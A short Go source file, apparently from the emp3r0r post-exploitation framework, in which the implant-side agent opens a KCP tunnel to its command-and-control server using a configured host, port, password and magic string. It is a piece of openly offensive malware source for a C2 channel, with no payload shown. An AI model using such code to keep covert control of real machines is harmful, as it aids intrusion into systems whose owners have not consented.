package agent

import (
	"context"
	"fmt"
	"log"

	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
)

var (
	KCPC2Ctx    context.Context
	KCPC2Cancel context.CancelFunc
)

// Connect to C2 KCP server, then to C2 server
func KCPC2Client() {
	if !RuntimeConfig.UseKCP {
		return
	}
	log.Printf("C2 traffic will go through KCP tunnel at port %s, KCP server port %s, C2 port %s",
		RuntimeConfig.KCPClientPort, RuntimeConfig.KCPServerPort, RuntimeConfig.CCPort)
	// this context ends when agent exits
	KCPC2Ctx, KCPC2Cancel = context.WithCancel(context.Background())
	defer func() {
		log.Print("KCPC2Client exited")
		KCPC2Cancel()
	}()
	kcp_server_addr := fmt.Sprintf("%s:%s", RuntimeConfig.CCHost, RuntimeConfig.KCPServerPort)
	err := transport.KCPTunClient(kcp_server_addr, RuntimeConfig.KCPClientPort,
		RuntimeConfig.Password, def.MagicString, KCPC2Ctx, KCPC2Cancel)
	if err != nil {
		log.Printf("KCPC2Client failed to start: %v", err)
	}
}
